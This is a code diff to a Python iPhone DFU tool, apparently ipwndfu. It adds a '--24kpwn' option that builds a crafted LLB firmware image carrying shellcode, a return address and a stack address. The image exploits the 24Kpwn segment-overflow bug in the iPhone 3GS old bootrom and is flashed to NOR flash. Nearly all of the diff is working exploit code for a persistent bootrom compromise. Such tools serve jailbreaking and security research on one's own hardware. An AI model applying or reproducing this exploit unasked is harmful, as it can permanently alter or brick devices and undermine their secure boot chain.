@@ -130,6 +130,7 @@ class Image3:
 
         # Fix first 20 bytes of 24kpwn LLB
         if self.type == 'illb'[::-1] and self.totalSize >= 0x24000:
+            # TODO: Check that DATA tag was in the correct location before decryption.
             DWORD1 = 0xea00000e
             DWORD2 = 0xe59ff018
             decrypted = struct.pack('<5I', DWORD1, DWORD2, DWORD2, DWORD2, DWORD2) + decrypted[20:]
@@ -137,6 +138,30 @@ class Image3:
             shshTag = []
             certTag = []
         return Image3.createImage3FromTags(self.type, typeTag + [(tagMagic, tagTotalSize, tagDataSize, decrypted)] + versTag + bordTag + shshTag + certTag)
+
+    def newDecrypted24KpwnLLB(self, securerom):
+        img3 = self.newDecryptedImage3()
+
+        (old_signed_size,) = struct.unpack('<I', img3[12:16])
+        TOTAL_SIZE = 0x24200
+        DATA_SIZE = 0x241BC
+        SIGNED_SIZE = 0x23FD4
+        img3 = img3[:4] + struct.pack('<3I', TOTAL_SIZE, DATA_SIZE, SIGNED_SIZE) + img3[16:20 + old_signed_size]
+        img3 += struct.pack('4s2I', '24KP'[::-1], 0x24000 - 24 - old_signed_size - 20, 0)
+
+        f = open('bin/24Kpwn-shellcode.bin', 'rb')
+        shellcode = f.read()
+        f.close()
+        MAX_SHELLCODE_LENGTH = 1024
+        assert len(shellcode) <= MAX_SHELLCODE_LENGTH
+
+        SHELLCODE_ADDRESS = 0x84024000 + 1 - 24 - 4 - len(shellcode)
+        payload = shellcode + struct.pack('<I4s2I4s2I', SHELLCODE_ADDRESS, 'SHSH'[::-1], 12, 0, 'CERT'[::-1], 12, 0)
+
+        STACK_ADDRESS = 0x84033E98
+        PADDING_BEFORE = 0x24000 - len(payload) - len(img3)
+        PADDING_AFTER = 0x30
+        return img3 + '\x00' * PADDING_BEFORE + payload + securerom[0xb000:0xb1cc] + struct.pack('<I', STACK_ADDRESS) + '\x00' * PADDING_AFTER
 
 class PwnedDeviceConfig:
     def __init__(self, version, cpid, aes_crypto_cmd, memmove, get_block_device, load_address, rom_address, rom_size, rom_sha256):
@@ -363,6 +388,45 @@ class PwnedDFUDevice():
 
         return nor
 
+    def add_24Kpwn_exploit_to_nor(self, nor):
+        (img2_magic, block_size, unused, firmware_block, firmware_block_count) = struct.unpack('<4s4I', nor[:20])
+        (img2_crc,) = struct.unpack('<I', nor[48:52])
+        assert img2_crc == binascii.crc32(nor[:48]) & 0xffffffff
+
+        firmware_offset = firmware_block * block_size
+        firmware_length = firmware_block_count * block_size
+        nor_firmware = nor[firmware_offset:firmware_offset + firmware_length]
+
+        if self.config.version != '359.3':
+            print 'ERROR: This device is not supported.'
+            sys.exit(1)
+
+        for c in nor[52:512]:
+            if c != '\x00':
+                print 'ERROR: Bytes following IMG2 header in NOR are not zero. alloc8 exploit was likely previously installed. Exiting.'
+                sys.exit(1)
+
+        new_nor_firmware = str()
+        offset = 0
+        count = 0
+        while 1:
+            img3_header = struct.unpack('<4s3I4s', nor_firmware[offset:offset+20])
+            if img3_header[0] != 'Img3'[::-1]:
+                break
+            img3_data = nor_firmware[offset:offset + img3_header[1]]
+            img3 = Image3(img3_data)
+            if img3_header[4] == 'illb'[::-1]:
+                new_nor_firmware += img3.newDecrypted24KpwnLLB(self.securerom_dump())
+            else:
+                new_nor_firmware += img3.newDecryptedImage3()
+            offset += img3_header[1]
+            count += 1
+
+        new_nor_firmware += '\xff' * (len(nor_firmware) - len(new_nor_firmware))
+        new_nor = nor[0:firmware_offset] + new_nor_firmware + nor[firmware_offset + firmware_length:]
+        assert len(nor) == len(new_nor)
+        return new_nor
+
     def add_alloc8_exploit_to_nor(self, nor):
         SHELLCODE_ADDRESS = 0x84026214
         MAX_SHELLCODE_LENGTH = 460
@@ -555,7 +619,7 @@ def print_help():
 
 if __name__ == '__main__':
     try:
-        opts, args = getopt.getopt(sys.argv[1:], 'prn:f:xg:G:u:U:', [])
+        opts, args = getopt.getopt(sys.argv[1:], 'prn:f:xg:G:u:U:', ['24kpwn'])
     except getopt.GetoptError:
         print 'ERROR: Invalid arguments provided.'
         print_help()
@@ -615,6 +679,17 @@ if __name__ == '__main__':
                 print 'This is not a compatible device. Flashing NOR is only supported on iPhone 3GS.'
                 sys.exit(1)
             device.nor_dump(saveBackup=True)
+            device.flash_nor(new_nor)
+
+        if opt == '--24kpwn':
+            device = PwnedDFUDevice()
+            if device.config.version != '359.3':
+                print 'Only iPhone 3GS (old bootrom) is supported.'
+                sys.exit(1)
+            print '*** based on 24Kpwn exploit (segment overflow) by the iPhone Dev Team ***'
+            print 'Installing 24Kpwn exploit to NOR.'
+            nor = device.nor_dump(saveBackup=True)
+            new_nor = device.add_24Kpwn_exploit_to_nor(nor)
             device.flash_nor(new_nor)
 
         if opt == '-x':
